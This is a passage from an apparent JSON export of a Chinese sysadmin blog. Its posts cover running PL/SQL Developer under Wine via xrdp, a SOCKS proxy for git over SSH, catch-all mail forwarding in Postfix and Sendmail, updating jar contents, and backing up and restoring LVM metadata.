Developer Icon=/etc/plsql.icon Type=Application Categories=Wine; 这时候回到远程桌面，已经可以看到桌面上多了个白色的东西： 右键点击，打开Properties： 把Allow executing file as program给勾住，图表也显示出来了 ok，弄好了，最后运行即可，是可以输入汉字的：\n最后补充一下，tnsnames.ora是放在下面这个目录下的：\n~/.wine/drive_c/oracle/network/admin ","permalink":"https://rendoumi.com/posts/20240118-plsql_linux/","summary":"\u003cp\u003e这真是个无比古怪的审计需求，需要让一些同事能访问oracle，但是不允许他们通过剪切板拷贝数据。\u003c/p\u003e\n\u003cp\u003e这只能是kvm+Ubuntu+xrdp+wine+plsql来实现了（CentOS应该也没问题）\u003c/p\u003e\n\u003cp\u003e首先准备ubuntu的iso，选精简的server版，桌面手动装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://mirrors.163.com/ubuntu-releases/12.04/ubuntu-12.04.5-server-i386.iso  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e生成kvm虚机磁盘：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 /home/kvm/ubuntu.qcow2 20G  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装kvm虚机：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    --name\u003cspan class=\"o\"\u003e=\u003c/span\u003eubuntu \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2048\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/home/kvm/ubuntu.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/home/kvm/ubuntu-12.04.5-server-i386.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5901\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这时候就要连到实机的vnc 5901端口，开始安装。反正是只要用plsql的，所以缺省都可。记住要装上sshd server，便于远程管理。\u003c/p\u003e\n\u003cp\u003e装ubuntu时会提示生成一个非root用户，就叫plsql好了。\u003c/p\u003e\n\u003cp\u003e安装不表，安装好了以后因为装了sshd，所以就可以ssh远程操作了。\u003c/p\u003e\n\u003cp\u003e安装wine：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install software-properties-common  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo add-apt-repository ppa:ubuntu-wine/ppa  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get update  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install wine  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装xrdp和gnome-shell以及输入法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install xrdp  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install gnome-shell  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install ibus  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install fcitx-table-wbpy  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e设置xrdp由gnome-session控制：\u003c/p\u003e","title":"在Ubuntu上装个plsql通过远程桌面访问oracle"},{"content":"万万没想到啊，github被封轮到自己头上了。\n这个博客是在windows下用Typora写的，然后hugo生成，直接用git for windows提交，今天git无法提交了。\n必须设置一下git ssh的代理了，我用的是socks5。\n在C:\\Users\\username\\.ssh\\config文件中添加相关配置，如果没有config文件需要手动创建，connect命令是git Windows客户端git for windows自带的, 位于\u0026lt;Git-install-path\u0026gt;\\mingw64\\bin\\connect.exe\nsocks代理添加以下配置\nHost github.com(改成你的站点) ProxyCommand connect -S 127.0.0.1:1080 %h %p 可以配置多个网站Host\nHost github.com(改成你的站点) ProxyCommand connect -S 127.0.0.1:1080 %h %p Host bitbucket.org(改成你的站点) ProxyCommand connect -S 127.0.0.1:1080 %h %p 如果Host设置为*，代理会对所有未配置的Host起作用。以下有三项配置，访问github使用第二项配置，访问bitbucket使用第三项配置，其它网站使用第一项配置\nHost * ProxyCommand \u0026#34;C:/Program Files/Git/mingw64/bin/connect.exe\u0026#34; -H 127.0.0.1:1080 %h %p IdentityFile \u0026#34;C:/Users/bybon/.ssh/id_rsa\u0026#34; TCPKeepAlive yes IdentitiesOnly yes Host github.com ProxyCommand connect -S 127.0.0.1:1080 %h %p Host bitbucket.com ProxyCommand connect -S 127.0.0.1:1080 %h %p ","permalink":"https://rendoumi.com/posts/20240117-git_proxy/","summary":"\u003cp\u003e万万没想到啊，github被封轮到自己头上了。\u003c/p\u003e\n\u003cp\u003e这个博客是在windows下用Typora写的，然后hugo生成，直接用git for windows提交，今天git无法提交了。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240117180143368\" loading=\"lazy\" src=\"/posts/20240117-git_proxy/image-20240117180143368.png\"\u003e\u003c/p\u003e\n\u003cp\u003e必须设置一下git ssh的代理了，我用的是socks5。\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003eC:\\Users\\username\\.ssh\\config\u003c/code\u003e文件中添加相关配置，如果没有config文件需要手动创建，connect命令是git Windows客户端\u003ccode\u003egit for windows\u003c/code\u003e自带的, 位于\u003ccode\u003e\u0026lt;Git-install-path\u0026gt;\\mingw64\\bin\\connect.exe\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003esocks代理添加以下配置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost github.com\u003cspan class=\"o\"\u003e(\u003c/span\u003e改成你的站点\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e可以配置多个网站Host\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost github.com\u003cspan class=\"o\"\u003e(\u003c/span\u003e改成你的站点\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost bitbucket.org\u003cspan class=\"o\"\u003e(\u003c/span\u003e改成你的站点\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果Host设置为\u003ccode\u003e*\u003c/code\u003e，代理会对所有未配置的Host起作用。以下有三项配置，访问github使用第二项配置，访问bitbucket使用第三项配置，其它网站使用第一项配置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost *\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ProxyCommand \u003cspan class=\"s2\"\u003e\u0026#34;C:/Program Files/Git/mingw64/bin/connect.exe\u0026#34;\u003c/span\u003e -H 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    IdentityFile \u003cspan class=\"s2\"\u003e\u0026#34;C:/Users/bybon/.ssh/id_rsa\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    TCPKeepAlive yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    IdentitiesOnly yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost bitbucket.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"设置git ssh代理"},{"content":"Postfix设置所有邮件都收到一个邮件用户下 申请了一个yi.zapto.org的免费域名，想把*@yi.zapto.org的邮件地址都送到zrr@yi.zapto.org这个地址去。\n用Postfix来做：\n编辑main.cf，设置邮件的域名，对了，最好在/etc/hosts中增加yi.zapto.org域名的解析。\n# vi /etc/postfix/main.cf ... inet_interfaces = all mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain, yi.zapto.org virtual_alias_maps = hash:/etc/postfix/virtual ... 编辑virtual，设置全域邮件转发到zrr\n# vi /etc/postfix/virtual @yi.zapto.org zrr # postmap /etc/virtual 如果有多个域名，那么在mydestination最后依次添加，并且修改virtual并重新hash即可。\nok，重启postfix\nservice postfix restart Sendmail设置所有邮件都收到一个邮件用户下 用Sendmail来做：\n编辑local-host-names，设置邮件的域名，对了，最好在/etc/hosts中增加yi.zapto.org的解析，否则sendmail启动时会反解，速度很慢。\n# vi /etc/mail/local-host-names yi.zapto.org 编辑virtusertable，设置全域邮件转发到zrr\n# vi /etc/virtusertable @yi.zapto.org zrr # rm /etc/virtusertable.db # cd /etc/mail # make 编辑sendmail.cf，增加信任用户nobody\n# vi /etc/mail/sendmail.cf ... ##################### # Trusted users # ##################### # this is equivalent to setting class \u0026#34;t\u0026#34; Ft/etc/mail/trusted-users Troot Tdaemon Tuucp Tnobody ... 这样所有发过来的邮件都会自动转发到zrr这个账号下。\n编辑sendmail.cf，开放端口，否则只能127.0.0.1收发邮件\n... #O DaemonPortOptions=Port=smtp,Addr=127.0.0.1, Name=MTA O DaemonPortOptions=Port=smtp,Addr=0.0.0.0, Name=MTA ... ok，重启sendmail\nservice sendmail restart ","permalink":"https://rendoumi.com/posts/20240117-mail_forward/","summary":"\u003ch2 id=\"postfix设置所有邮件都收到一个邮件用户下\"\u003ePostfix设置所有邮件都收到一个邮件用户下\u003c/h2\u003e\n\u003cp\u003e申请了一个yi.zapto.org的免费域名，想把*@yi.zapto.org的邮件地址都送到zrr@yi.zapto.org这个地址去。\u003c/p\u003e\n\u003cp\u003e用Postfix来做：\u003c/p\u003e\n\u003cp\u003e编辑main.cf，设置邮件的域名，对了，最好在/etc/hosts中增加yi.zapto.org域名的解析。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/postfix/main.cf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003einet_interfaces\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e all  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emydestination\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$myhostname\u003c/span\u003e, localhost.\u003cspan class=\"nv\"\u003e$mydomain\u003c/span\u003e, localhost, \u003cspan class=\"nv\"\u003e$mydomain\u003c/span\u003e, yi.zapto.org  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evirtual_alias_maps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e hash:/etc/postfix/virtual  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑virtual，设置全域邮件转发到zrr\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/postfix/virtual\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@yi.zapto.org zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# postmap /etc/virtual\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果有多个域名，那么在mydestination最后依次添加，并且修改virtual并重新hash即可。\u003c/p\u003e\n\u003cp\u003eok，重启postfix\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice postfix restart  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"sendmail设置所有邮件都收到一个邮件用户下\"\u003eSendmail设置所有邮件都收到一个邮件用户下\u003c/h2\u003e\n\u003cp\u003e用Sendmail来做：\u003c/p\u003e\n\u003cp\u003e编辑local-host-names，设置邮件的域名，对了，最好在/etc/hosts中增加yi.zapto.org的解析，否则sendmail启动时会反解，速度很慢。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/mail/local-host-names\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyi.zapto.org  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑virtusertable，设置全域邮件转发到zrr\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/virtusertable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@yi.zapto.org zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# rm /etc/virtusertable.db\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# cd /etc/mail\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑sendmail.cf，增加信任用户nobody\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/mail/sendmail.cf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#####################\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   Trusted users   #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#####################\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# this is equivalent to setting class \u0026#34;t\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFt/etc/mail/trusted-users  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTroot  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTdaemon  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTuucp  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTnobody  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样所有发过来的邮件都会自动转发到zrr这个账号下。\u003c/p\u003e","title":"Postfix和Sendmail设置所有邮件都收到一个邮件用户下"},{"content":"jar包可以当作一个zip包来看待。\njar文件：/home/resin.jar 需要更新包中com/caucho/server/port/Port.class类文件\n方法1，直接更新：\n查看jar包的文件目录结构 jar tf resin.jar 更新指定内容 jar uf resin.jar com/caucho/server/port/Port.class jar uf testRedis-33.jar redis.properties 方法2，解压替换后再打包：\n解压包： mkdir new cd new jar xvf ../testRedis-33.jar 进行修改 vi redis.properties 重新压包 jar cmvf META-INF/MANIFEST.MF t.jar * ","permalink":"https://rendoumi.com/posts/20240117-jar_update/","summary":"\u003cp\u003ejar包可以当作一个zip包来看待。\u003c/p\u003e\n\u003cp\u003ejar文件：/home/resin.jar\n需要更新包中com/caucho/server/port/Port.class类文件\u003c/p\u003e\n\u003cp\u003e方法1，直接更新：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e查看jar包的文件目录结构\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar tf resin.jar\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e更新指定内容\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar uf resin.jar com/caucho/server/port/Port.class  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar uf testRedis-33.jar redis.properties  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e方法2，解压替换后再打包：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e解压包：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir new  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e new  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar xvf ../testRedis-33.jar\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e进行修改\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi redis.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e重新压包\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar cmvf META-INF/MANIFEST.MF t.jar *  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"更新jar包或者jar包中的文件"},{"content":"怀念永远的freashmeat 这个网站是从一开站就关注的，基本上天天都看，有10几年了。\n持续到2014年6月18日，永久的封站了。\n时不时的，仍会打开这个网页，逡巡良久！！！，时光荏苒，2024年了，关站都要10年了。纪念一下！\n","permalink":"https://rendoumi.com/posts/20240106-freshmeat_forever/","summary":"\u003ch1 id=\"怀念永远的freashmeat\"\u003e怀念永远的freashmeat\u003c/h1\u003e\n\u003cp\u003e这个网站是从一开站就关注的，基本上天天都看，有10几年了。\u003c/p\u003e\n\u003cp\u003e持续到2014年6月18日，永久的封站了。\u003c/p\u003e\n\u003cp\u003e时不时的，仍会打开这个网页，逡巡良久！！！，时光荏苒，2024年了，关站都要10年了。纪念一下！\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240116110912176\" loading=\"lazy\" src=\"/posts/20240106-freshmeat_forever/image-20240116110912176.png\"\u003e\u003c/p\u003e","title":"怀念永远的freshmeat.net"},{"content":"这是个反面教材。在京东数科的时候用的是kvm的虚机系统，同事追求更快，文件镜像用的是raw分区，里面装了lvm。\ngrub的启动文件如下：\nkernel /vmlinuz-2.6.32-431.el6.x86_64 ro root=/dev/mapper/vg_root-lvroot rd_NO_LUKS rd_LVM_LV=vg_root/lvroot LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 console=ttyS0,115200n8 rd_LVM_LV=vg_root/lvswap KEYBOARDTYPE=pc KEYTABLE=us crashkernel=auto rhgb quiet rd_NO_DM 看上面，root也被建立在lvroot的lvm卷上了。\n然后就遇到了断电，导致kvm挂掉了，悲催的是lvm卷被破坏了，用尽办法也弄不出来卷信息。因为lvm的metadata没有备份。\n数据全丢，无法恢复，杯具了。\n综上LVM的metadata必须备份，方法如下：\nvgcfgbackup /etc/lvm/backup/VolGroup是当前lvm配置的一个备份，而/etc/lvm/archive是归档。\n看看归档：\nls -l /etc/lvm/archive/* -rw-------. 1 root root 1820 Jun 12 2015 /etc/lvm/archive/VolGroup_00000-444365108.vg 恢复方法：\nvgcfgrestore 具体恢复的步骤： 首先查看blkid，看看硬盘分区的UUID\nblkid /dev/mapper/VolGroup-LogVol01: UUID=\u0026#34;d6d24cc3-5e4a-4f4d-a0b1-2524e727b0fe\u0026#34; TYPE=\u0026#34;ext4\u0026#34; /dev/sda1: UUID=\u0026#34;3d0103ac-1b18-4da5-bc20-4b7a980a55c0\u0026#34; TYPE=\u0026#34;ext4\u0026#34; /dev/sda2: UUID=\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; TYPE=\u0026#34;LVM2_member\u0026#34; /dev/mapper/VolGroup-LogVol00: UUID=\u0026#34;06fe7af0-dee5-494a-9b5b-11bf95244acd\u0026#34; TYPE=\u0026#34;swap\u0026#34; 查看lvm信息，找出里面所有物理卷的UUID：\nless /etc/lvm/archive/VolGroup_00000-444365108.vg ... physical_volumes { pv0 { id = 